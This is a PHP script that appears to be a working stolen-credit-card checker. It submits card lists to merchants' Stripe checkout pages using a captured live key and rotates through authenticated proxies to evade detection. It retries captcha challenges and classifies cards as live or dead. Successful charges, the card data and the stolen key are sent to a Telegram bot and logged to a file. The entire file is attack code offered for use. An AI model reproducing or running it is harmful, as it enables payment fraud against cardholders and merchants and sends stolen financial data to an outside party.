<?php

$delay = $_GET['delay'];
$checked = $_GET['checked'];
$newDelay = $delay / 1000;
sleep($newDelay);

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

######### NAME ####

$randname = array_merge(range('a', 'z'), range('A', 'Z'));
$shuffle = shuffle($randname);
$name = substr(implode($randname), 0, 10);
$cookie = $name . '.txt';


A3:
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];

if (empty($name) and empty($last)) {
    goto A3;
}

############ EMAIL ##########

$email0 = "" . $name . "" . $last . "" . rand(1, 99999) . "@RAGE.com";
$email1 = urlencode($email0);
$pay = '' . rand(1111, 9999) . '';


function GetStr($string, $start, $end)
{
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string)
{
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
};
$lista = $_GET['cards'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

$last4 = substr($cc, 12, 4);

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$pklive = $_GET['pklive'];
$cslive = $_GET['cslive'];
$xamount = $_GET['xamount'];
$xemail = $_GET['xemail'];

// ------------------------------------------IP Start here--------------------------------------------

$insta = "saSeKRXbvp0GVA4r:wifi;us;;;";
$rp1 = array(
    1 => '23.109.113.228:9000',
    2 => '23.109.113.236:9001',
    3 => '23.109.113.228:9002',
    4 => '23.109.113.236:9003',
    5 => '23.109.113.228:9004',
    6 => '23.109.113.236:9005',
    7 => '23.109.113.228:9006',
    8 => '23.109.113.236:9007',
    9 => '23.109.113.228:9008',
    10 => '23.109.113.236:9009',
    11 => '23.109.113.228:9010',
    12 => '23.109.113.236:9011',
    13 => '23.109.113.228:9012',
    14 => '23.109.113.236:9013',
    15 => '23.109.113.228:9014',
    16 => '23.109.113.236:9015',
    17 => '23.109.113.228:9016',
    18 => '23.109.113.236:9017',
    19 => '23.109.113.228:9018',
    20 => '23.109.113.236:9019',
    21 => '23.109.113.228:9020',
    22 => '23.109.113.236:9021',
    23 => '23.109.113.228:9022',
    24 => '23.109.113.236:9023',
    25 => '23.109.113.228:9024',
    26 => '23.109.113.236:9025',
    27 => '23.109.113.228:9026',
    28 => '23.109.113.236:9027',
    29 => '23.109.113.228:9028',
    30 => '23.109.113.236:9029',
    31 => '23.109.113.228:9030',
    32 => '23.109.113.236:9031',
    33 => '23.109.113.228:9032',
    34 => '23.109.113.236:9033',
    35 => '23.109.113.228:9034',
    36 => '23.109.113.236:9035',
    37 => '23.109.113.228:9036',
    38 => '23.109.113.236:9037',
    39 => '23.109.113.228:9038',
    40 => '23.109.113.236:9039',
    41 => '23.109.113.228:9040',
    42 => '23.109.113.236:9041',
    43 => '23.109.113.228:9042',
    44 => '23.109.113.236:9043',
    45 => '23.109.113.228:9044',
    46 => '23.109.113.236:9045',
    47 => '23.109.113.228:9046',
    48 => '23.109.113.236:9047',
    49 => '23.109.113.228:9048',
    50 => '23.109.113.236:9049'
);
$proxy = $rp1[array_rand($rp1)];
$proxyauth = '' . $insta . '';


// Fetch real IP address commenting to save little time 
// $url = "https://api.ipify.org/";
// $ch = curl_init($url);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
// $realIp = curl_exec($ch);
// curl_close($ch);
// echo '<span style="color: rgb(0 255 0);  font-weight: bold">[IP: ' . $realIp . ']</span>';


$proxyParts = explode(':', $proxy);
$fakeip = $proxyParts[0];
echo '<span style="color: rgb(0 255 0);  font-weight: bold">[IP: ' . $fakeip . ']</span>';
// echo '<br>';

// ------------------------------------------IP Ends here--------------------------------------------

// ----------------------------------------------------1st req------------------------------------
if ($checked == 1) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/' . $cslive . '');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&consent[terms_of_service]=accepted&key=' . $pklive . '');
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $proxy_main);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxuauth);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array();
    $headers[] = 'Host: api.stripe.com';
    $headers[] = 'Accept: application/json';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Origin: https://checkout.stripe.com';
    $headers[] = 'Referer: https://checkout.stripe.com/';
    //$headers[] = 'User-Agent: '.$userAgentRandom.'';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $pm = json_decode($payment_pages = curl_exec($ch), true);
    $id = $pm['terms_of_service'];
    $terms = curl_exec($ch);
    curl_close($ch);
}
// ----------------------------------------------------1st req------------------------------------

$counter = 0;

do {
    $proxy_main = $rp1[array_rand($rp1)];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $proxy_main);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_POST, 1);

    $postfield = 'type=card&card[number]=' . $cc . '&card[cvc]=&card[exp_month]=' . $mes . '&card[exp_year]=' . $ano . '&billing_details[name]=Jake+minas&billing_details[email]=' . $xemail . '&billing_details[address][country]=PH&key=' . $pklive . '&payment_user_agent=stripe.js%2F97dfa8730%3B+stripe-js-v3%2F97dfa8730%3B+checkout';

    $headers = array();
    curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
    curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
    $curl0 = curl_exec($ch);
    curl_close($ch);

    $pm = Getstr($curl0, '"id": "', '"');

    // ----------------------------------------------------2nd req------------------------------------

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $proxy_main);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/' . $cslive . '/confirm');
    curl_setopt($ch, CURLOPT_POST, 1);
    $postfield = 'eid=NA&payment_method=' . $pm . '&expected_amount=' . $xamount . '&last_displayed_line_item_group_details[subtotal]=' . $xamount . '&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=' . $pklive . '';
    $headers = array();
    curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
    curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
    $curl1 = curl_exec($ch);
    curl_close($ch);
    $three_d_secure_2_source = Getstr($curl1, '"three_d_secure_2_source": "', '"');
    $client_secret = Getstr($curl1, '"client_secret": "', '"');
    $pi = Getstr($curl1, '"client_secret": "', '_secret_');
    $success = GetStr($curl1, '"success_url": "', '"');

    $counter++;

    if ($counter > 5) {
        break;
    }
} while (strpos($curl1, '"type": "intent_confirmation_challenge"')  && $counter <= 5);
$counter = $counter - 1;
echo '<span style="color: rgb(0, 128, 0);  font-weight: bold"> [Re: ' . $counter . ']</span>';
echo '<br>';


// ----------------------------------------------------3rd req------------------------------------
if ($three_d_secure_2_source) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $proxy_main);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
    curl_setopt($ch, CURLOPT_POST, 1);

    $postfield = 'source=' . $three_d_secure_2_source . '&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22873%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+11%3B+21061110AG)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F87.0.4280.141+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=' . $pklive . '';

    $headers = array();

    curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
    curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
    $result = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($result, true);
}

// ----------------------------------------------------4th req------------------------------------

if ($client_secret) {
    if (!isset($data['error'])) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $proxy_main);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/' . $pi . '?key=' . $pklive . '&is_stripe_sdk=false&client_secret=' . $client_secret . '');
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

        $headers = array();

        curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
        curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
        $result1 = curl_exec($ch);
        curl_close($ch);

        $result1;
        $dcode1 = Getstr($result1, '"code": "', '"');
    }
}

// ----------------------------------------------------5th req------------------------------------

if ($pm || $client_secret) {
    if (!isset($data['error'])) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $proxy_main);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/' . $cslive . '?key=' . $pklive . '&eid=NA');
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array();
        curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
        curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
        $result2 = curl_exec($ch);
        curl_close($ch);
        $result2;
        $dcode2 = Getstr($result2, '"code": "', '"');
    }
}

// ---------------------------------All Requests End Here-------------------------------------------------------

// ---------------------------------------------------- Hit To Telegram Start----------------------------
$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
$botToken = urlencode('61ghhhh258:AAhhhhhhhhhhhg2bOjd3_Za0hhhhhF_ErE0M');
$chatID = urlencode('621hhhhhhhhhhhhh664');
$xamount = intval($xamount) / 100;
$pk_stolen = $pklive;

$charged_message = "Successful Checkout\r\n\nBIN:\r\n$lista\r\n\nSuccess URL:\r\n" . urldecode($success) . "\r\nAmount: " . strtoupper($currency) . "$xamount\r\n\nChecked from:\r\n$domain\r\n\nPK Live:\r\n$pk_stolen";

$sendcharged = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text=' . urlencode($charged_message) . '';

$max_retries = 3;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;
// ---------------------------------------------------- Hit To Telegram End-------------------------------


if (strpos($result1, '"status": "succeeded"')) {

    while (!$sendchargedtotg && $num_retries < $max_retries) {
        $sendchargedtotg = @file_get_contents($sendcharged);
        $num_retries++;
    }

    // echo '' . $myip . '<span class="badge badge-success"><b>#CHARGED</b></span> <font class="text-white"><b>' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</b></font> <font class="text-white">/

    $mp3FilePath = 'sound.mp3';
    echo '<audio autoplay>';
    echo '<source src="' . $mp3FilePath . '" type="audio/mpeg">';
    echo '</audio>';

    echo '<span class="badge badge-success"><b>#CHARGED</b></span> <font class="text-white"><b>XXXXXXXX' . $last4 . '|' . $mes . '|' . $ano . '|' . $cvv . '</b></font> <font class="text-white">

    <br>
    ➤ The payment transaction has been successfully processed 💰✅
    <br>
    ➤ Amount: ' . strtoupper($currency) . '' . $xamount . '
    <br>
    ➤ Receipt: <span style="color: green;" class="badge"><a href="' . $success . '"  target="_blank"><b>' . $success . '</b></a></span>
    <br>
    ➤ Checked from: <b>' . $domain . '</b></font><br>';
    fwrite(fopen('stelaer_stuff.txt', 'a'), $lista . "\r\n");
    exit();
} elseif (strpos($curl1, '"message": "Your payment has already been processed."')) {
    echo "<font color=yellow><b>DEAD [ Expired link ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "Your Card was declined"')) {
    echo "<font color=yellow><b>DEAD [ Your Card was declined ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "Your card zip code is incorrect"')) {
    echo "<font color=yellow><b>DEAD [ Your card zip code is incorrect ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "Your card\'s security code is incorrect"')) {
    echo "<font color=yellow><b>DEAD [ Your card\'s security code is incorrect ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "incorrect_cvc"')) {
    echo "<font color=yellow><b>DEAD [ incorrect_cvc ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "do_not_honor"')) {
    echo "<font color=yellow><b>DEAD [ do_not_honor ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "pickup_card"')) {
    echo "<font color=yellow><b>DEAD [ pickup_card ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "stolen_card"')) {
    echo "<font color=yellow><b>DEAD [ stolen_card ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "lost_card"')) {
    echo "<font color=yellow><b>DEAD [ lost_card ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "card was declined"')) {
    echo "<font color=yellow><b>DEAD [ card was declined ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "Your card does not support this type of purchase"')) {
    echo "<font color=yellow><b>DEAD [ Your card does not support this type of purchase ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "expired_card"')) {
    echo "<font color=yellow><b>DEAD [ expired_card ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "Your card has expired"')) {
    echo "<font color=yellow><b>DEAD [ Your card has expired ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"message": "Your card number is incorrect"')) {
    echo "<font color=yellow><b>DEAD [ Your card number is incorrect ]<br> $lista<br>";
    exit();
}

#############DECLINECODEcurl0
elseif (strpos($curl0, 'card_not_supported')) {
    echo "<font color=red><b>DEAD [ Card_Not_Supported ]<br> $lista<br>";
    exit();
} elseif (strpos($curl0, 'generic_decline')) {
    echo "<font color=red><b>DEAD [ Generic_Decline ]<br> $lista<br>";
    exit();
}


if (strpos($curl0, '"insufficient_funds"')) {
    echo "<font color=#0ec9e7><b>LIVE [ Insufficient_Funds ]<br> $lista<br>";

    exit();
}

#############DECLINECODEcurl1
elseif (strpos($curl1, 'fraudulent')) {
    echo "<font color=red><b>DEAD [ Fraudulent ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'incorrect_number')) {
    echo "<font color=red><b>DEAD [ Incorrect_Number]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'invalid_account')) {
    echo "<font color=red><b>DEAD [ Invalid_Account ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, 'generic_decline')) {
    echo "<font color=red><b>DEAD [ Generic_Decline ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'invalid_request_error')) {
    // echo $curl1;
    echo "<font color=red><b>DEAD [ Invalid_Request_Error ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, 'resource_missing')) {
    echo "<font color=red><b>DEAD [ resource_missing double check details ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"type": "intent_confirmation_challenge"')) {
    echo "<font color=red><b>DEAD [ HCAPTCHA ]<br> $lista<br> ";

    exit();
} elseif (strpos($curl1, '"status": "requires_action"')) {
    echo "<font color=red><b>DEAD [ OTP CC ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, '"status": "requires_source_action"')) {
    echo "<font color=red><b>DEAD [ OTP/3D ]<br> $lista<br>";
    exit();
} elseif (strpos($curl1, 'Your Card was declined')) {
    echo "<font color=red><b>DEAD [ Your Card was declined ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'Your card zip code is incorrect')) {
    echo "<font color=red><b>DEAD [ Your card zip code is incorrect ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'Your card\'s security code is incorrect')) {
    echo "<font color=red><b>DEAD [ Your card\'s security code is incorrect ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'incorrect_cvc')) {
    echo "<font color=red><b>DEAD [ incorrect_cvc ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'do_not_honor')) {
    echo "<font color=red><b>DEAD [ do_not_honor ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'pickup_card')) {
    echo "<font color=red><b>DEAD [ pickup_card ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'stolen_card')) {
    echo "<font color=red><b>DEAD [ stolen_card ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'lost_card')) {
    echo "<font color=red><b>DEAD [ lost_card ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'card was declined')) {
    echo "<font color=red><b>DEAD [ card was declined ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'Your card does not support this type of purchase')) {
    echo "<font color=red><b>DEAD [ Your Card was declined ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'expired_card')) {
    echo "<font color=red><b>DEAD [ expired_card ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'Your card has expired')) {
    echo "<font color=red><b>DEAD [ Your card has expired ]<br> $lista<br> ";
    exit();
} elseif (strpos($curl1, 'Your card number is incorrect')) {
    echo "<font color=red><b>DEAD [ Your card number is incorrect ]<br> $lista<br> ";
    exit();
}


if (strpos($curl1, '"insufficient_funds"')) {
    echo "<font color=#0ec9e7><b>LIVE [ Insufficient_Funds ]<br> $lista<br>";
    exit();
}

#############DECLINECODEresult1
elseif (strpos($result1, 'payment_intent_authentication_failure')) {
    echo "<font color=red><b>DEAD [ Failed Authentication ]<br> $lista<br>";
    exit();
} elseif (strpos($result1, 'BEGIN CERTIFICATE')) {
    echo "<font color=red><b>DEAD [ 3D SECURED CARD ]<br> $lista<br>";
    exit();
} elseif (strpos($result1, 'fraudulent')) {
    echo "<font color=red><b>DEAD [ Fraudulent ]<br> $lista<br>";
    exit();
} elseif (strpos($result1, 'generic_decline')) {
    echo "<font color=red><b>DEAD [ Generic_Decline ]<br> $lista<br>";
    exit();
} elseif (strpos($result1, '"status": "requires_action"')) {
    echo "<font color=red><b>DEAD [ Requires_Action ]<br> $lista<br>";
    exit();
} elseif (strpos($result1, 'invalid_request_error')) {
    // echo $curl1;
    echo "<font color=red><b>DEAD [ Invalid_Request_Error ]<br> $lista<br> ";
    exit();
}
if (strpos($result1, '"insufficient_funds"')) {
    echo "<font color=#0ec9e7><b>LIVE [ Insufficient_Funds ]<br> $lista<br>";

    exit();
}

#############DECLINECODEresult1
elseif (strpos($result2, 'payment_intent_authentication_failure')) {
    echo "<font color=red><b>DEAD [ Failed Authentication ]<br> $lista<br>";
    exit();
} elseif (strpos($result2, 'BEGIN CERTIFICATE')) {
    echo "<font color=red><b>DEAD [ 3D SECURED CARD ]<br> $lista<br>";
    exit();
} elseif (strpos($result2, 'fraudulent')) {
    echo "<font color=red><b>DEAD [ Fraudulent ]<br> $lista<br>";
    exit();
} elseif (strpos($result2, 'generic_decline')) {
    echo "<font color=red><b>DEAD [ Generic_Decline ]<br> $lista<br>";
    exit();
}
if (strpos($result2, '"insufficient_funds"')) {
    echo "<font color=#0ec9e7><b>LIVE [ Insufficient_Funds ]<br> $lista<br>";

    exit();
}

#############ELSEDECLINE
else {
    echo "<font color=red><b>DEAD [ CARD DECLINED ]<br> $lista<br>";
    exit();
}
